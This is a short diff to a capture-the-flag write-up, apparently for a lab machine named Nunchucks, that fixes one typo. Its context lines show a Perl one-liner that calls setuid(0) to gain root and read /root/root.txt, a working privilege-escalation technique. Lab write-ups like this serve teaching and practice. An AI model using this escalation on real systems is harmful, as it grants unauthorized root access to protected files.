@@ -268,7 +268,7 @@ david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exe
 root
 ```
 
-So I tried to read the contents of the **root flag** directly which achieving root shell.
+So I tried to read the contents of the **root flag** directly without achieving root shell.
 ```console
 david@nunchucks:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "cat /root/root.txt";'
 
